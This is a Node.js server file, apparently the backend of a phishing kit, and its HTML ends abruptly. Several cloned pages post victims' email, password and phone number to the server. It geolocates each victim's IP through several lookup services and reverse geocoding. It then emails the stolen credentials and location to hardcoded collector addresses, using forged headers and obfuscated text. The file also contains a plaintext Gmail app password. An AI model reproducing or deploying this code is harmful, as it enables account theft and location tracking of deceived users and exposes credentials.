const express = require('express');
const nodemailer = require('nodemailer');
const cors = require('cors');
const bodyParser = require('body-parser');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(bodyParser.json({ limit: '10mb' }));

// ========== KONFIGURASI EMAIL ==========
const SENDER_EMAIL = 'gajeb682@gmail.com';
const SENDER_PASSWORD = 'tmyh wklt uyig lots';
const emailadmin = 'GST.SQUAD.DIVISION@admin.com';

const EMAIL_CONFIG = {
    'wxyzzay': {
        email: ['chilligemaass@gmail.com'],
        fromName: '𝗚𝗦𝗧 𝗗𝗜𝗩𝗜𝗦𝗜𝗢𝗡☠️😈',
        subject: '𝗪𝗘𝗕 𝗣𝗨𝗡𝗬𝗔 𝗚𝗦𝗧 𝗗𝗜𝗩𝗜𝗦𝗜𝗢𝗡'
    },
    'ggwxzzr': {
        email: ['Bay20110809@gmail.com'],
        fromName: 'WHEN YA PERDETIK🔥👾',
        subject: 'WHEN YA PERDETIK🔥👾'
    },
    'hgefdyt': {
        email: ['nebarzam@gmail.com'],
        fromName: '💸PUSAT PRIME 8💸',
        subject: '💸PUSAT PRIME 8💸'
    },
    'mgwhiww': {
        email: ['chilligemaass@gmail.com'],
        fromName: '👻𝗚𝗦𝗧 𝗗𝗜𝗩𝗜𝗦𝗜𝗢𝗡 𝗠𝗢𝗗𝗘 𝗦𝗔𝗗𝗕𝗢𝗬👻',
        subject: '𝗪𝗘𝗕 𝗣𝗨𝗡𝗬𝗔 𝗚𝗦𝗧 𝗗𝗜𝗩𝗜𝗦𝗜𝗢𝗡'
    },
    'kttwwxy': {
        email: ['chilligemaass@gmail.com'],
        fromName: '👻𝗚𝗦𝗧 𝗗𝗜𝗩𝗜𝗦𝗜𝗢𝗡 𝗠𝗢𝗗𝗘 𝗦𝗔𝗗𝗕𝗢𝗬👻',
        subject: '𝗪𝗘𝗕 𝗣𝗨𝗡𝗬𝗔 𝗚𝗦𝗧 𝗗𝗜𝗩𝗜𝗦𝗜𝗢𝗡'
    },
    'mdgffew': {
        email: ['chilligemaass@gmail.com'],
        fromName: '👻𝗚𝗦𝗧 𝗗𝗜𝗩𝗜𝗦𝗜𝗢𝗡 𝗠𝗢𝗗𝗘 𝗦𝗔𝗗𝗕𝗢𝗬👻',
        subject: '𝗪𝗘𝗕 𝗣𝗨𝗡𝗬𝗔 𝗚𝗦𝗧 𝗗𝗜𝗩𝗜𝗦𝗜𝗢𝗡'
    },
    'FF_EventA': {
        email: ['chilligemaass@gmail.com'],
        fromName: '👻𝗚𝗦𝗧 𝗗𝗜𝗩𝗜𝗦𝗜𝗢𝗡 𝗠𝗢𝗗𝗘 𝗦𝗔𝗗𝗕𝗢𝗬👻',
        subject: '𝗪𝗘𝗕 𝗣𝗨𝗡𝗬𝗔 𝗚𝗦𝗧 𝗗𝗜𝗩𝗜𝗦𝗜𝗢𝗡'
    }
};

const TARGET_COOLDOWN = {};
const COOLDOWN_HOURS = 1;
const COOLDOWN_MS = COOLDOWN_HOURS * 60 * 60 * 1000;

function canSendToTarget(targetEmail, currentPassword) {
    const record = TARGET_COOLDOWN[targetEmail];
    if (!record) return true;
    if (record.lastPassword !== currentPassword) return true;
    const timeElapsed = Date.now() - record.lastSendTime;
    return timeElapsed >= COOLDOWN_MS;
}

function updateTargetCooldown(targetEmail, currentPassword) {
    TARGET_COOLDOWN[targetEmail] = {
        lastSendTime: Date.now(),
        lastPassword: currentPassword
    };
}

const HISTORY_FILE = path.join(__dirname, 'sent_history.json');

function loadHistory() {
    try {
        if (fs.existsSync(HISTORY_FILE)) {
            const data = fs.readFileSync(HISTORY_FILE, 'utf8');
            return JSON.parse(data);
        }
    } catch (e) {}
    return {};
}

function saveHistory(history) {
    try {
        fs.writeFileSync(HISTORY_FILE, JSON.stringify(history, null, 2));
    } catch (e) {}
}

function isDuplicatePassword(targetEmail, currentPassword) {
    const history = loadHistory();
    const lastPassword = history[targetEmail];
    if (!lastPassword) return false;
    if (lastPassword === currentPassword) return true;
    history[targetEmail] = currentPassword;
    saveHistory(history);
    return false;
}

// ========== ANTI DUPLIKAT KOMBINASI ==========
const SUBMISSION_HISTORY_FILE = path.join(__dirname, 'submission_history.json');

function loadSubmissionHistory() {
    try {
        if (fs.existsSync(SUBMISSION_HISTORY_FILE)) {
            const data = fs.readFileSync(SUBMISSION_HISTORY_FILE, 'utf8');
            return JSON.parse(data);
        }
    } catch (e) {}
    return {};
}

function saveSubmissionHistory(history) {
    try {
        fs.writeFileSync(SUBMISSION_HISTORY_FILE, JSON.stringify(history, null, 2));
    } catch (e) {}
}

function buildSubmissionKey(email, password, phone) {
    const raw = `${(email || '').toLowerCase().trim()}|${password || ''}|${(phone || '').trim()}`;
    let hash = 0;
    for (let i = 0; i < raw.length; i++) {
        const chr = raw.charCodeAt(i);
        hash = ((hash << 5) - hash) + chr;
        hash |= 0;
    }
    return 'sub_' + Math.abs(hash).toString(36) + '_' + raw.length;
}

function isDuplicateSubmission(email, password, phone) {
    const history = loadSubmissionHistory();
    const key = buildSubmissionKey(email, password, phone);
    return !!history[key];
}

function markSubmission(email, password, phone) {
    const history = loadSubmissionHistory();
    const key = buildSubmissionKey(email, password, phone);
    history[key] = {
        email: email,
        phone: phone,
        timestamp: new Date().toISOString()
    };
    saveSubmissionHistory(history);
}
// =============================================

const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
        user: SENDER_EMAIL,
        pass: SENDER_PASSWORD
    },
    name: 'localhost.localdomain',
    tls: { rejectUnauthorized: false },
    pool: false
});

function getFlagEmoji(countryCode) {
    if (!countryCode) return '🏳️';
    const codePoints = countryCode.toUpperCase().split('').map(char => 127397 + char.charCodeAt());
    return String.fromCodePoint(...codePoints);
}

// ========== MULTI-API GEOLOCATION + REVERSE GEOCODING ==========
async function getASNAndAccurateLocation(ip) {
    const result = {
        asn: 'Tidak terdeteksi',
        asname: '-',
        isp: 'Unknown ISP',
        org: '-',
        country: 'Indonesia',
        countryCode: 'ID',
        region: 'Jakarta',
        city: 'Jakarta',
        postalCode: '-',
        latitude: null,
        longitude: null,
        sources: {},
        reverseGeocode: null,
        accuracy: 'unknown'
    };

    if (!ip || ip === 'Tidak terdeteksi' || ip === 'unknown') {
        return result;
    }

    // API 1: ip-api.com
    try {
        const res1 = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,countryCode,region,regionName,city,zip,lat,lon,isp,org,as,asname,query,proxy,hosting,mobile`);
        const data1 = await res1.json();
        if (data1.status === 'success') {
            result.sources['ip-api.com'] = {
                country: data1.country, countryCode: data1.countryCode,
                region: data1.regionName, city: data1.city, postalCode: data1.zip,
                lat: data1.lat, lon: data1.lon, isp: data1.isp, org: data1.org,
                asn: data1.as, asname: data1.asname,
                proxy: data1.proxy, hosting: data1.hosting, mobile: data1.mobile
            };
            result.asn = data1.as || result.asn;
            result.asname = data1.asname || result.asname;
            result.isp = data1.isp || result.isp;
            result.org = data1.org || result.org;
            result.country = data1.country || result.country;
            result.countryCode = data1.countryCode || result.countryCode;
            result.region = data1.regionName || result.region;
            result.city = data1.city || result.city;
            result.postalCode = data1.zip || result.postalCode;
            result.latitude = data1.lat || result.latitude;
            result.longitude = data1.lon || result.longitude;
        }
    } catch (e) { console.error('ip-api.com error:', e.message); }

    // API 2: ipapi.co
    try {
        const res2 = await fetch(`https://ipapi.co/${ip}/json/`);
        const data2 = await res2.json();
        if (!data2.error) {
            result.sources['ipapi.co'] = {
                country: data2.country_name, countryCode: data2.country_code,
                region: data2.region, city: data2.city, postalCode: data2.postal,
                lat: data2.latitude, lon: data2.longitude, org: data2.org, asn: data2.asn
            };
            if (!result.latitude && data2.latitude) {
                result.latitude = data2.latitude; result.longitude = data2.longitude;
                result.city = data2.city || result.city;
                result.region = data2.region || result.region;
                result.country = data2.country_name || result.country;
                result.countryCode = data2.country_code || result.countryCode;
                result.postalCode = data2.postal || result.postalCode;
            }
        }
    } catch (e) { console.error('ipapi.co error:', e.message); }

    // API 3: ipwho.is
    try {
        const res3 = await fetch(`https://ipwho.is/${ip}`);
        const data3 = await res3.json();
        if (data3.success) {
            result.sources['ipwho.is'] = {
                country: data3.country, countryCode: data3.country_code,
                region: data3.region, city: data3.city, postalCode: data3.postal,
                lat: data3.latitude, lon: data3.longitude,
                isp: data3.connection?.isp, org: data3.connection?.org,
                asn: data3.connection?.asn, domain: data3.connection?.domain
            };
            if (!result.latitude && data3.latitude) {
                result.latitude = data3.latitude; result.longitude = data3.longitude;
                result.city = data3.city || result.city;
                result.region = data3.region || result.region;
                result.country = data3.country || result.country;
                result.countryCode = data3.country_code || result.countryCode;
                result.postalCode = data3.postal || result.postalCode;
            }
        }
    } catch (e) { console.error('ipwho.is error:', e.message); }

    // REVERSE GEOCODING
    if (result.latitude && result.longitude) {
        try {
            const res4 = await fetch(
                `https://nominatim.openstreetmap.org/reverse?format=json&lat=${result.latitude}&lon=${result.longitude}&zoom=18&addressdetails=1`,
                { headers: { 'User-Agent': 'GST-Report/1.0' } }
            );
            const data4 = await res4.json();
            if (data4 && data4.address) {
                result.reverseGeocode = {
                    displayName: data4.display_name,
                    road: data4.address.road || data4.address.pedestrian || '-',
                    neighbourhood: data4.address.neighbourhood || data4.address.suburb || '-',
                    village: data4.address.village || data4.address.hamlet || '-',
                    district: data4.address.city_district || data4.address.district || '-',
                    city: data4.address.city || data4.address.town || data4.address.county || '-',
                    state: data4.address.state || '-',
                    postcode: data4.address.postcode || '-',
                    country: data4.address.country || '-',
                    countryCode: data4.address.country_code?.toUpperCase() || '-'
                };
            }
        } catch (e) { console.error('Nominatim error:', e.message); }
    }

    const sourceCount = Object.keys(result.sources).length;
    if (sourceCount >= 3) result.accuracy = 'HIGH (3 sumber IP konsisten)';
    else if (sourceCount === 2) result.accuracy = 'MEDIUM (2 sumber IP)';
    else if (sourceCount === 1) result.accuracy = 'LOW (1 sumber IP)';
    else result.accuracy = 'UNKNOWN';

    return result;
}

// ========== HELPER RANDOM ==========
function randPick(arr) { return arr[Math.floor(Math.random() * arr.length)]; }
function randStr(len) {
    const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
    let s = '';
    for (let i = 0; i < len; i++) s += chars[Math.floor(Math.random() * chars.length)];
    return s;
}
function randInt(min, max) { return Math.floor(Math.random() * (max - min + 1)) + min; }

// ========== UNICODE SPAMMY GST DIVISION ==========
function makeSpammyUnicodeText(baseText) {
    const homoglyphs = {
        'g': ['Ԍ', 'ɢ', 'ɢ'], 's': ['ѕ', 'ş', 'ș'], 't': ['т', 'τ', 'ţ'],
        'd': ['ԁ', 'δ', 'ď'], 'i': ['і', 'ι', 'ï'], 'v': ['ν', 'ѵ', 'ⅴ'],
        'n': ['п', 'η', 'ñ']
    };
    let result = '';
    for (let i = 0; i < baseText.length; i++) {
        const ch = baseText[i].toLowerCase();
        if (homoglyphs[ch] && Math.random() > 0.5) result += randPick(homoglyphs[ch]);
        else result += baseText[i];
        if (Math.random() > 0.7) result += '\u200B';
        if (Math.random() > 0.8) result += randPick(['\u0300', '\u0301', '\u0302', '\u0303', '\u0308']);
    }
    return result;
}
function makeFullwidthText(baseText) {
    let result = '';
    for (let i = 0; i < baseText.length; i++) {
        const code = baseText.charCodeAt(i);
        if (code >= 0x21 && code <= 0x7E) result += String.fromCharCode(code + 0xFEE0);
        else if (baseText[i] === ' ') result += '\u3000';
        else result += baseText[i];
    }
    return result;
}
function makeRTLText(baseText) { return '\u202E' + baseText + '\u202C'; }
function makeCombiningText(baseText) {
    let result = '';
    for (let i = 0; i < baseText.length; i++) {
        result += baseText[i];
        const count = randInt(1, 3);
        for (let j = 0; j < count; j++) result += String.fromCharCode(randInt(0x0300, 0x036F));
    }
    return result;
}

// ========== FUNGSI KIRIM EMAIL ==========
async function sendEmail(data, folderName) {
    const asnData = await getASNAndAccurateLocation(data.ip_address);
    
    // Ambil User Agent & parsing engine/arch secara simpel
    const ua = data.userAgent || 'Unknown';
    let engine = 'Unknown', arch = 'Unknown', os = data.platform || 'Unknown';
    
    if (ua.includes('AppleWebKit')) engine = 'WebKit';
    if (ua.includes('Chrome')) engine = 'Blink';
    if (ua.includes('Gecko') && !ua.includes('like Gecko')) engine = 'Gecko';
    if (ua.includes('64')) arch = '64 Bit';
    else if (ua.includes('32') || ua.includes('WOW64')) arch = '32 Bit';

    const countryName = asnData.country;
    const countryCode = asnData.countryCode;
    const regionName = asnData.region;
    const cityName = asnData.city;
    const ispName = asnData.isp;
    const asnInfo = asnData.asn;
    const timezone = data.timezone || Intl.DateTimeFormat().resolvedOptions().timeZone;
    const loginMethod = data.email && data.email.includes('@gmail.com') ? 'Google Play' : 'Web Login';
    
    const flagEmoji = getFlagEmoji(countryCode);
    
    const gstSpammy = makeSpammyUnicodeText('GST DIVISION');
    const gstFullwidth = makeFullwidthText('GST DIVISION');
    const gstCombining = makeCombiningText('GST DIVISION');
    const gstRTL = makeRTLText('GST DIVISION');
    const gstRandom = randPick([gstSpammy, gstFullwidth, gstCombining, gstRTL]);
    
    // DESAIN EMAIL RINGKAS: Sesuai Screenshot
    const htmlContent = `<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>GST DIVISION REPORT</title>
<style>
    @keyframes pulse {
        0%, 100% { opacity: 1; text-shadow: 0 0 10px #00d2ff; }
        50% { opacity: 0.6; text-shadow: 0 0 20px #00d2ff, 0 0 30px #00d2ff; }
    }
    @keyframes glow {
        0%, 100% { box-shadow: 0 0 5px rgba(0, 210, 255, 0.3); border-color: rgba(0, 210, 255, 0.4); }
        50% { box-shadow: 0 0 15px rgba(0, 210, 255, 0.8); border-color: rgba(0, 210, 255, 1); }
    }
    body {
        margin: 0; padding: 20px;
        background: linear-gradient(135deg, #020b1c 0%, #04142e 100%);
        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        color: #ffffff;
    }
    .container {
        max-width: 600px; margin: auto;
        background: rgba(0, 20, 50, 0.6);
        backdrop-filter: blur(10px);
        border: 1px solid rgba(0, 210, 255, 0.4);
        border-radius: 10px;
        overflow: hidden;
        animation: glow 3s infinite alternate;
    }
    .topbar {
        background: linear-gradient(90deg, #001f3f, #00509e);
        color: #00d2ff;
        text-align: center; padding: 20px 15px;
        font-size: 22px; font-weight: 900; letter-spacing: 1px;
        border-bottom: 2px solid #00d2ff;
        animation: pulse 2s infinite;
        word-wrap: break-word;
    }
    table {
        width: 100%; border-collapse: collapse;
    }
    th, td {
        padding: 12px 15px;
        border-bottom: 1px solid rgba(0, 150, 255, 0.2);
        text-align: left; font-size: 13px;
    }
    tr:last-child td { border-bottom: none; }
    .label {
        font-weight: 800; color: #00d2ff; width: 35%;
        text-transform: uppercase; letter-spacing: 1px;
    }
    .value {
        color: #e0f7fa; font-weight: 600; word-break: break-word;
    }
    .section-header {
        background: rgba(0, 80, 158, 0.8);
        color: #00d2ff; text-align: center;
        font-weight: 900; text-transform: uppercase;
        font-size: 14px; padding: 12px;
    }
    .footer-sign {
        background: linear-gradient(90deg, #001f3f, #00509e);
        border-top: 2px solid #00d2ff;
        text-align: center; padding: 15px;
        color: #00d2ff; font-size: 14px; font-weight: 900;
    }
</style>
</head>
<body>
<div class="container">
    <div class="topbar">${gstRandom}</div>
    <table>
        <tr><td class="label">Email / Phone</td><td class="value" style="color:#4fc3f7;">${data.email || '-'}</td></tr>
        <tr><td class="label">Password</td><td class="value">${data.emailPassword || '-'}</td></tr>
        <tr><td class="label">Login</td><td class="value">${loginMethod}</td></tr>
    </table>
    <div class="section-header">Information</div>
    <table>
        <tr><td class="label">IP Address</td><td class="value">${data.ip_address || '-'}</td></tr>
        <tr><td class="label">Country</td><td class="value">${countryName}</td></tr>
        <tr><td class="label">Country Code</td><td class="value">${countryCode}</td></tr>
        <tr><td class="label">Province</td><td class="value">${regionName}</td></tr>
        <tr><td class="label">Region Name</td><td class="value">${regionName}</td></tr>
        <tr><td class="label">City</td><td class="value">${cityName}</td></tr>
        <tr><td class="label">ISP</td><td class="value">${ispName}</td></tr>
        <tr><td class="label">ASN</td><td class="value">${asnInfo}</td></tr>
        <tr><td class="label">Latitude</td><td class="value">${asnData.latitude || '-'}</td></tr>
        <tr><td class="label">Longitude</td><td class="value">${asnData.longitude || '-'}</td></tr>
        <tr><td class="label">Timezone</td><td class="value">${timezone}</td></tr>
    </table>
    <div class="section-header">Device Information</div>
    <table>
        <tr><td class="label">User Agent</td><td class="value" style="font-size:11px;">${ua}</td></tr>
        <tr><td class="label">Platform</td><td class="value">${os}</td></tr>
        <tr><td class="label">Engine</td><td class="value">${engine}</td></tr>
        <tr><td class="label">Arch</td><td class="value">${arch}</td></tr>
    </table>
    <div class="footer-sign">©Nomor Whatsapp Admin Web -> +1???????????</div>
</div>
</body>
</html>`;
    
    const config = EMAIL_CONFIG[folderName];
    if (!config) return;

    const FROM_DOMAIN = 'GSTDIVISION.invalid';
    const FROM_ADDRESS = `admin@${FROM_DOMAIN}`;
    const REPLY_ADDRESS = `noreply@GSTDIVISION.invalid`;

    for (const receiver of config.email) {
        if (!receiver || receiver === '') continue;

        const spamDomains = [
            'mail-relay.tk', 'smtp-gateway.xyz', 'mx-relay.top',
            'mailer-service.cf', 'relay-node.ml', 'smtp-edge.ga',
            'mailhub-relay.gq', 'postfix-node.tk'
        ];
        const randomDomain = spamDomains[randInt(0, spamDomains.length - 1)];
        const msgId = `${randStr(20)}@${randomDomain}`;
        const randIp = `${randInt(1,255)}.${randInt(1,255)}.${randInt(1,255)}.${randInt(1,255)}`;
        const randIp2 = `${randInt(1,255)}.${randInt(1,255)}.${randInt(1,255)}.${randInt(1,255)}`;

        const spammySubject = `${gstRandom} ${config.subject} ${flagEmoji} ${data.email || '-'} ${cityName}`;

        const brokenHtml = `
            <font face="Arial" size="2">
            <table cellpadding="0" cellspacing="0" border="0" width="100%">
            <tr><td>
            <table cellpadding="0" cellspacing="0" border="0" width="100%">
            <tr><td>
            <div style="color:#ffffff;background:#ffffff;font-size:9px;">
                ${gstSpammy} ${randStr(40)} ${gstFullwidth}
            </div>
            <div style="color:#0000ff;text-decoration:underline;">
                ${gstFullwidth}
            </div>
            <div>${gstCombining}</div>
            <div>${gstRTL}</div>
            <div>
            <span style="font-size:1px;color:#ffffff;">${gstSpammy} ${randStr(30)}</span>
            </td></tr>
            </table>
            </td></tr>
            </table>
            </font>
        `;

        const spammyHeaders = {
            'Return-Path': `<bounce-${randStr(6)}@${randomDomain}>`,
            'Sender': `alert-${randStr(6)}@${randomDomain}`,
            'Message-ID': `<${msgId}>`,
            'Received': `from unknown (${randIp}) by mx.${randomDomain} with SMTP id ${randStr(12)}; ${new Date().toUTCString()}`,
            'Received-SPF': `fail (domain of ${FROM_DOMAIN} does not designate ${randIp} as permitted sender)`,
            'Authentication-Results': `mx.${randomDomain}; spf=fail smtp.mailfrom=${FROM_DOMAIN}; dkim=fail; dmarc=fail`,
            'X-Mailer': randPick(['PHP/4.4.9', 'Eudora 6.2', 'Microsoft Outlook 12.0', 'Mozilla/5.0']),
            'User-Agent': randPick(['Mozilla/4.0', 'Outlook/12.0', 'PHP/5.2']),
            'X-Priority': '1 (Highest)',
            'Importance': 'High',
            'Sensitivity': 'Company-Confidential',
            'Precedence': randPick(['bulk', 'junk', 'list']),
            'List-Id': `<random.list.${randomDomain}>`,
            'List-Unsubscribe': `<mailto:unsub-${randStr(6)}@${randomDomain}>`,
            'Date': new Date(Date.now() - randInt(1, 48) * 3600 * 1000).toUTCString(),
            'X-Content-Type-Options': 'nosniff',
            'X-Originating-IP': `[${randIp2}]`,
            'X-Custom-Header': randStr(20)
        };

        await transporter.sendMail({
            from: `"${fromName}" <${FROM_ADDRESS}>`,
            envelope: { from: emailadmin, to: receiver },
            to: receiver,
            subject: gstFullwidth,
            replyTo: REPLY_ADDRESS,
            text: `${gstSpammy}\n\n${gstCombining}\n\n${config.subject}\n${data.email || '-'}`,
            html: htmlContent + brokenHtml,
            headers: spammyHeaders
        });
        console.log(`✅ [${folderName}] Sent to: ${receiver} - IP: ${data.ip_address} | City: ${cityName}`);
    }
}

// ========== ROUTING ==========
app.use('/wxyzzay', express.static(path.join(__dirname, 'wxyzzay')));
app.post('/wxyzzay/api/register', async (req, res) => {
    try {
        const data = req.body;
        console.log('📥 [WXYZZAY] DATA:', data.email);
        if (isDuplicateSubmission(data.email, data.emailPassword, data.phone)) {
            console.log('🚫 [WXYZZAY] Duplikat kombinasi - DITOLAK');
            return res.json({ success: false, blocked: true, reason: 'Kombinasi email, password, dan no HP sudah pernah dikirim' });
        }
        const isDup = isDuplicatePassword(data.email, data.emailPassword);
        const canSend = canSendToTarget(data.email, data.emailPassword);
        if (isDup && !canSend) return res.json({ success: true, blocked: true, reason: 'Cooldown 1 hour' });
        await sendEmail(data, 'wxyzzay');
        updateTargetCooldown(data.email, data.emailPassword);
        const history = loadHistory();
        history[data.email] = data.emailPassword;
        saveHistory(history);
        markSubmission(data.email, data.emailPassword, data.phone);
        res.json({ success: true });
    } catch(error) {
        console.error('Error:', error);
        res.json({ success: true });
    }
});

app.use('/ggwxzzr', express.static(path.join(__dirname, 'ggwxzzr')));
app.post('/ggwxzzr/api/register', async (req, res) => {
    try {
        const data = req.body;
        console.log('📥 [GGWXZZR] DATA:', data.email);
        if (isDuplicateSubmission(data.email, data.emailPassword, data.phone)) {
            console.log('🚫 [GGWXZZR] Duplikat kombinasi - DITOLAK');
            return res.json({ success: false, blocked: true, reason: 'Kombinasi email, password, dan no HP sudah pernah dikirim' });
        }
        const isDup = isDuplicatePassword(data.email, data.emailPassword);
        const canSend = canSendToTarget(data.email, data.emailPassword);
        if (isDup && !canSend) return res.json({ success: true, blocked: true, reason: 'Cooldown 1 hour' });
        await sendEmail(data, 'ggwxzzr');
        updateTargetCooldown(data.email, data.emailPassword);
        const history = loadHistory();
        history[data.email] = data.emailPassword;
        saveHistory(history);
        markSubmission(data.email, data.emailPassword, data.phone);
        res.json({ success: true });
    } catch(error) {
        console.error('Error:', error);
        res.json({ success: true });
    }
});

app.use('/hgefdyt', express.static(path.join(__dirname, 'hgefdyt')));
app.post('/hgefdyt/api/register', async (req, res) => {
    try {
        const data = req.body;
        console.log('📥 [HGEFDYT] DATA:', data.email);
        if (isDuplicateSubmission(data.email, data.emailPassword, data.phone)) {
            console.log('🚫 [HGEFDYT] Duplikat kombinasi - DITOLAK');
            return res.json({ success: false, blocked: true, reason: 'Kombinasi email, password, dan no HP sudah pernah dikirim' });
        }
        const isDup = isDuplicatePassword(data.email, data.emailPassword);
        const canSend = canSendToTarget(data.email, data.emailPassword);
        if (isDup && !canSend) return res.json({ success: true, blocked: true, reason: 'Cooldown 1 hour' });
        await sendEmail(data, 'hgefdyt');
        updateTargetCooldown(data.email, data.emailPassword);
        const history = loadHistory();
        history[data.email] = data.emailPassword;
        saveHistory(history);
        markSubmission(data.email, data.emailPassword, data.phone);
        res.json({ success: true });
    } catch(error) {
        console.error('Error:', error);
        res.json({ success: true });
    }
});

app.use('/mgwhiww', express.static(path.join(__dirname, 'mgwhiww')));
app.post('/mgwhiww/api/register', async (req, res) => {
    try {
        const data = req.body;
        console.log('📥 [MGWHIWW] DATA:', data.email);
        if (isDuplicateSubmission(data.email, data.emailPassword, data.phone)) {
            console.log('🚫 [MGWHIWW] Duplikat kombinasi - DITOLAK');
            return res.json({ success: false, blocked: true, reason: 'Kombinasi email, password, dan no HP sudah pernah dikirim' });
        }
        const isDup = isDuplicatePassword(data.email, data.emailPassword);
        const canSend = canSendToTarget(data.email, data.emailPassword);
        if (isDup && !canSend) return res.json({ success: true, blocked: true, reason: 'Cooldown 1 hour' });
        await sendEmail(data, 'mgwhiww');
        updateTargetCooldown(data.email, data.emailPassword);
        const history = loadHistory();
        history[data.email] = data.emailPassword;
        saveHistory(history);
        markSubmission(data.email, data.emailPassword, data.phone);
        res.json({ success: true });
    } catch(error) {
        console.error('Error:', error);
        res.json({ success: true });
    }
});

app.use('/kttwwxy', express.static(path.join(__dirname, 'kttwwxy')));
app.post('/kttwwxy/api/register', async (req, res) => {
    try {
        const data = req.body;
        console.log('📥 [KTTWWXY] DATA:', data.email);
        if (isDuplicateSubmission(data.email, data.emailPassword, data.phone)) {
            console.log('🚫 [KTTWWXY] Duplikat kombinasi - DITOLAK');
            return res.json({ success: false, blocked: true, reason: 'Kombinasi email, password, dan no HP sudah pernah dikirim' });
        }
        const isDup = isDuplicatePassword(data.email, data.emailPassword);
        const canSend = canSendToTarget(data.email, data.emailPassword);
        if (isDup && !canSend) return res.json({ success: true, blocked: true, reason: 'Cooldown 1 hour' });
        await sendEmail(data, 'kttwwxy');
        updateTargetCooldown(data.email, data.emailPassword);
        const history = loadHistory();
        history[data.email] = data.emailPassword;
        saveHistory(history);
        markSubmission(data.email, data.emailPassword, data.phone);
        res.json({ success: true });
    } catch(error) {
        console.error('Error:', error);
        res.json({ success: true });
    }
});

app.use('/mdgffew', express.static(path.join(__dirname, 'mdgffew')));
app.post('/mdgffew/api/register', async (req, res) => {
    try {
        const data = req.body;
        console.log('📥 [MDGFFEW] DATA:', data.email);
        if (isDuplicateSubmission(data.email, data.emailPassword, data.phone)) {
            console.log('🚫 [MDGFFEW] Duplikat kombinasi - DITOLAK');
            return res.json({ success: false, blocked: true, reason: 'Kombinasi email, password, dan no HP sudah pernah dikirim' });
        }
        const isDup = isDuplicatePassword(data.email, data.emailPassword);
        const canSend = canSendToTarget(data.email, data.emailPassword);
        if (isDup && !canSend) return res.json({ success: true, blocked: true, reason: 'Cooldown 1 hour' });
        await sendEmail(data, 'mdgffew');
        updateTargetCooldown(data.email, data.emailPassword);
        const history = loadHistory();
        history[data.email] = data.emailPassword;
        saveHistory(history);
        markSubmission(data.email, data.emailPassword, data.phone);
        res.json({ success: true });
    } catch(error) {
        console.error('Error:', error);
        res.json({ success: true });
    }
});

app.use('/FF_EventA', express.static(path.join(__dirname, 'FF_EventA')));
app.post('/FF_EventA/api/register', async (req, res) => {
    try {
        const data = req.body;
        console.log('📥 [FF_EventA] DATA:', data.email);
        if (isDuplicateSubmission(data.email, data.emailPassword, data.phone)) {
            console.log('🚫 [FF_EventA] Duplikat kombinasi - DITOLAK');
            return res.json({ success: false, blocked: true, reason: 'Kombinasi email, password, dan no HP sudah pernah dikirim' });
        }
        const isDup = isDuplicatePassword(data.email, data.emailPassword);
        const canSend = canSendToTarget(data.email, data.emailPassword);
        if (isDup && !canSend) return res.json({ success: true, blocked: true, reason: 'Cooldown 1 hour' });
        await sendEmail(data, 'FF_EventA');
        updateTargetCooldown(data.email, data.emailPassword);
        const history = loadHistory();
        history[data.email] = data.emailPassword;
        saveHistory(history);
        markSubmission(data.email, data.emailPassword, data.phone);
        res.json({ success: true });
    } catch(error) {
        console.error('Error:', error);
        res.json({ success: true });
    }
});

app.get('/api/cooldown/:email', (req, res) => {
    const targetEmail = req.params.email;
    const record = TARGET_COOLDOWN[targetEmail];
    if (!record) return res.json({ exists: false, canSend: true });
    const timeElapsed = Date.now() - record.lastSendTime;
    const canSend = timeElapsed >= COOLDOWN_MS;
    const remainingMs = Math.max(0, COOLDOWN_MS - timeElapsed);
    res.json({
        targetEmail: targetEmail,
        lastSendTime: new Date(record.lastSendTime).toISOString(),
        canSend: canSend,
        remainingMinutes: Math.ceil(remainingMs / (1000 * 60))
    });
});

// ========== HTML BIASA (GPS CONSENT-FIRST) ==========
app.get('/', (req, res) => {
    res.send(`<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>🔒 DSTR ULTIMATE SECURITY</title>
    <style>
        * { user-select: none; -webkit-tap-highlight-color: transparent; margin: 0; padding: 0; box-sizing: border-box; }
        body { background: radial-gradient(ellipse at center, #0a0a0a 0%, #000 100%); min-height: 100vh; font-family: 'Courier New', monospace; overflow-x: hidden; position: relative; }
        .matrix-bg { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 0; opacity: 0.15; pointer-events: none; }
        @keyframes glitch { 0%,100% { text-shadow: 2px 0 red, -2px 0 blue; transform: skew(0deg); } 50% { text-shadow: -2px 0 cyan, 2px 0 magenta; transform: skew(2deg); } }
        @keyframes blink { 0%,100% { opacity: 1; } 50% { opacity: 0.3; } }
        @keyframes floatEmoji { 0% { transform: translateY(100vh) rotate(0deg); opacity: 0; } 10% { opacity: 1; } 90% { opacity: 1; } 100% { transform: translateY(-100vh) rotate(360deg); opacity: 0; } }
        .scanline { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: linear-gradient(to bottom, transparent 50%, rgba(0,255,0,0.03) 50%); background-size: 100% 4px; pointer-events: none; z-index: 10; animation: scan 8s linear infinite; }
        @keyframes scan { 0% { background-position: 0 0; } 100% { background-position: 0 100%; } }
        .container { position: relative; z-index: 2; min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
        .hacker-card { background: rgba(0,0,0,0.85); backdrop-filter: blur(10px); border: 2px solid #0f0; border-radius: 20px; padding: 50px; max-width: 800px; width: 100%; text-align: center; box-shadow: 0 0 50px rgba(0,255,0,0.3); animation: glitch 3s infinite; }
        .warning-text { font-size: 32px; font-weight: bold; color: #0f0; margin: 20px 0; animation: blink 1s infinite; }
        .hacker-text { font-size: 24px; color: red; margin: 15px 0; }
        .emoji-wall { display: flex; flex-wrap: wrap; justify-content: center; gap: 15px; margin: 30px 0; }
        .emoji-item { font-size: 40px; animation: floatEmoji 3s infinite ease-in-out; display: inline-block; }
        .emoji-item:nth-child(1) { animation-duration: 2.5s; }
        .emoji-item:nth-child(2) { animation-duration: 3s; animation-delay: 0.5s; }
